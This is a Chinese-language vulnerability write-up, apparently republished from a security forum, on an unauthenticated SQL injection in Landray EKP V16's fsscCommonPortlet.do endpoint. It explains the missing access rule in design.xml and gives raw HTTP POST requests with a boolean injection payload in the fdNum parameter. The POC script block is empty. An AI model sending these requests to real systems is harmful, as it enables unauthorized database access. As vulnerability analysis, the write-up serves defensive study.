#  蓝凌EKP V16 未授权SQL注入漏洞分析   
 船山信安   2024-12-23 16:05  
  
本地测试环境版本：V16.0.6.R.20220729  
## 漏洞分析  
  
漏洞路径在：/fssc/common/fssc_common_portlet/fsscCommonPortlet.do，对应的Action为FsscCommonPortletAction  
，在其getICareByFdId  
方法中存在注入漏洞：  
```
```  
  
fdNum参数可控，很明显的SQL注入。在WEB-INF/KmssConfig/fssc/common/design.xml文件中定义了/fssc/common/  
路径下的权限访问：  
```
```  
  
正常情况下，访问/fssc/common/  
路径下的所有action，validator都会为true，即未授权访问，在上面的design.xml配置文件中，只对/fssc/common/  
的如下路径做了权限控制：  
```
tree.jsp*
fssc_common_transfer_field/fsscCommonTransferField.do*
fssc_common_transfer_log/fsscCommonTransferLog.do*
```  
  
而漏洞触发路径/fssc/common/fssc_common_portlet/fsscCommonPortlet.do  
并未存在于上述限制路径，所以可直接未授权访问。  
## 漏洞复现  
### step 1  
  
访问save方法，填充一下数据库，数据包如下：  
```
POST /ekp/fssc/common/fssc_common_portlet/fsscCommonPortlet.do HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 76

method=saveICare&fdId=&fdNum=1&docSubject=1&fdName=1&createTime=1&fdStatus=1
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicOWgiaB7iaiaGBYw2c15SDZpz5icgbJvAqQ7WvGV9EgwJVzJdfgl8phPEOqN0l3AOOib3w3xBfLQBbrNCg/640?wx_fmt=png&from=appmsg "")  
### step 2  
  
验证存在SQL注入漏洞  
- fdNum=asdasd'+or+'1'='2  
  
- fdNum=asdasd'+or+'1'='1  
  
```
POST /ekp/fssc/common/fssc_common_portlet/fsscCommonPortlet.do HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

method=getICareByFdId&fdNum=asdasd'+or+'1'='1&ordertype=down
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicOWgiaB7iaiaGBYw2c15SDZpz56Ed5hsibvfnhUGwDqlZ4de0Ib8QTyovKSRGDDrxZTkib2YXfTIdT4UzA/640?wx_fmt=png&from=appmsg "")  
  
POC脚本如下：(本地测试环境是MSSQL，Mysql or Oracle自行修改脚本)  
```
```  
  
来源：https://xz.aliyun.com/  感谢【  
co_w****  
   
/  
】  
  
